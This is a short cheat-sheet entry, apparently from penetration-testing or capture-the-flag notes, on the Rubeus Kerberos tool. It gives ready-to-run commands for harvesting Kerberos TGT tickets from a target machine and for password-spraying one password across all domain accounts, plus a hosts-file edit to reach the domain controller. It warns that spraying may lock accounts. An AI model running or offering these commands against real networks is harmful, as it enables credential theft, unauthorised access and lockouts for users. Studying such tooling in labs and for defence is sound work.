### Rubeus
**Harvesting**

- Rubeus needs to be executed from the target machine
- To harvest TGTs every 30 seconds and display the hash
```
Rubeus.exe harvest /interval:30
```

**Brute-forcing/Password Spraying**

- Spray a single password against all available user accounts and in the end receive a .kirbi TGT for that user
- Before password spraying domain controller domain name must be added to windows host file
```
echo <IP> CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```
- For spraying a single password against several users
```
Rubeus.exe brute /password:PASSWORD /noticket
```
**May lead to locking user accounts due to too many login attempts, depending uponthe account lockout policies**
